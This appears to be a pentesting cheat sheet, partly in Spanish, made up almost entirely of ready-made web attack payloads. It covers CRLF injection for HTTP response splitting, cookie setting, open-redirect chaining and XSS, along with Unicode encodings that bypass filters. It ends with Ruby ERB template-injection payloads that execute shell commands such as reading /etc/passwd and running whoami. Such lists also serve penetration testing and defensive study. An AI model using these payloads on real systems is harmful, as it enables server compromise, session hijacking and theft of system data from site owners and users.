
https://book.hacktricks.xyz/v/es/pentesting-web/crlf-0d-0a

1. HTTP Response Splitting
• /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
• //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
• /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
• /google.com/%2F..%0D%0AHeader-Test:test2
• /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
• /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
• /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
• %E5%98%8A = %0A = \u560a
• %E5%98%8D = %0D = \u560d
• %E5%98%BE = %3E = \u563e (>)
• %E5%98%BC = %3C = \u563c (<)
• Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test


## CRLF +SSTI

Probamos alguno de estos payloads, para ello deberemos poner el bypass, por ejemplo %0A, y en muchos caso urlencodearlo
### Ruby - Code execution

[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby---code-execution)

Execute code using SSTI for ERB engine.

```ruby
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

